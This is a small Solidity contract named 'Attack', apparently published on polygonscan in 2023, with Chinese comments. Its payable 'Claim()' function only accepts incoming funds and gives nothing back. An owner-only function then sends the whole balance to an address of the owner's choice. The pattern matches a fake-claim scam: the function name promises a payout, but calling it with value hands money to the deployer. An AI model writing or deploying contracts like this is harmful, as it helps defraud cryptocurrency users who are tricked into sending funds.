/**
 *Submitted for verification at polygonscan.com on 2023-07-03
*/

contract Attack {
    address public owner;
    constructor () {
        owner= msg.sender;
    }
    function transferAllEthTo(address payable recipient) public {
        // 在实际中，你应该在此添加权限控制，
        // 例如只有合约的拥有者才能调用此函数。
        require(msg.sender == owner, "not owner!");
        require(recipient != address(0), "Invalid recipient");

        uint256 balance = address(this).balance;

        // 将所有的ETH发送到指定的地址
        (bool success, ) = recipient.call{value: balance}("");
        require(success, "Transfer failed");
    }
    function Claim() public payable {}

}